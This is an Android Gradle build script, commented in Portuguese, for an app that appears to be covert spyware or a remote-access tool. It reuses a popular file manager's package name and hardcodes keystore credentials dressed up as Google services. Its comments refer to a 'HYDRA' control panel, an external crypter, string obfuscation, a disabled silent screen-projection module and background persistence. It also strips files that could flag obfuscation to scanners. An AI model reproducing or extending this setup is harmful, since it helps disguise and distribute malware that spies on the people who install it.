plugins {
    id 'com.android.application'
}

def skipParanoid = true // LSParanoid desabilitado — plugin jar ausente neste ambiente de build

// Tenta aplicar o plugin de ofuscação apenas se disponível no classpath
if (!skipParanoid) {
    try {
        apply plugin: 'org.lsposed.lsparanoid'
        println '[OK] Modulo LSParanoid acoplado.'
    } catch (Exception e) {
        println '[WARN] LSParanoid nao disponivel, ignorando: ' + e.message
    }
} else {
    println '[WARN] HYDRA_SKIP_PARANOID: LSParanoid ignorado (build isolado do painel).'
}

android {
    namespace 'com.seguranca.protecao'
    compileSdk 34

    defaultConfig {
        applicationId "com.estrongs.android.pop"
        minSdk 24
        targetSdk 34
        versionCode 10205
        versionName "1.2.5"

        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
        
        // BuildConfig - R8 ativo no release; crypter externo pode ser aplicado depois
        buildConfigField "boolean", "IS_OBFUSCATED", "true"
        buildConfigField "String", "SERVER_URL", '"wss://localhost:3000"'
        
        // NDK para Silent Projection (libbinder nativo) - DESABILITADO POR ENQUANTO
        // Requer CMake instalado. Para habilitar:
        // 1. Instale CMake via Android Studio SDK Manager
        // 2. Descomente as linhas abaixo
        
        // externalNativeBuild {
        //     cmake {
        //         cppFlags "-std=c++17"
        //         arguments "-DANDROID_STL=c++_shared"
        //     }
        // }
        // 
        // ndk {
        //     abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'
        // }
    }
    
    // Configuração do CMake para código nativo - DESABILITADO
    // externalNativeBuild {
    //     cmake {
    //         path "src/main/cpp/CMakeLists.txt"
    //         version "3.18.1"
    //     }
    // }
    
    signingConfigs {
        release {
            storeFile file('../google-services-release.jks')
            storePassword 'GooglePlayServices2024'
            keyAlias 'google-services-key'
            keyPassword 'GooglePlayServices2024'
            v1SigningEnabled true
            v2SigningEnabled true
            enableV3Signing true
            enableV4Signing true
        }
    }

    buildTypes {
        debug {
            // Debug SEM ofuscação
            minifyEnabled false
            shrinkResources false
            // ProGuard COMPLETAMENTE DESABILITADO
            // proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        release {
            minifyEnabled true
            shrinkResources false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
    }
    
    // Desabilita compressão de recursos
    aaptOptions {
        cruncherEnabled = false
    }
    
    // Configurações de packaging para manter tudo legível
    packagingOptions {
        // Não comprime nada
        jniLibs {
            useLegacyPackaging = true
        }
        // Remove arquivos que podem ser detectados como ofuscação/criptografia
        resources {
            excludes += [
                'DebugProbesKt.bin',
                'META-INF/*.version',
                'META-INF/NOTICE*',
                'META-INF/LICENSE*',
                'META-INF/DEPENDENCIES',
                'META-INF/services/*',
                'kotlin/**',
                'okhttp3/**',
                'assets/dexopt/*'
            ]
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }

    buildFeatures {
        viewBinding true
        buildConfig true
    }
}

dependencies {
    implementation('androidx.appcompat:appcompat:1.6.1') {
        exclude group: 'androidx.profileinstaller'
    }
    implementation('com.google.android.material:material:1.11.0') {
        exclude group: 'androidx.profileinstaller'
    }
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation('androidx.lifecycle:lifecycle-runtime-ktx:2.7.0') {
        exclude group: 'androidx.profileinstaller'
    }
    
    // Para comunicação de rede
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'

    // WorkManager for Android 12+ background persistence
    implementation('androidx.work:work-runtime:2.9.0') {
        exclude group: 'androidx.profileinstaller'
    }
    
    // Para persistência local
    implementation('androidx.room:room-runtime:2.6.1') {
        exclude group: 'androidx.profileinstaller'
    }
    annotationProcessor 'androidx.room:room-compiler:2.6.1'

    if (skipParanoid) {
        compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
    }
    
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}

// Força exclusão de profileinstaller de todas as dependências
configurations.all {
    exclude group: 'androidx.profileinstaller', module: 'profileinstaller'
}
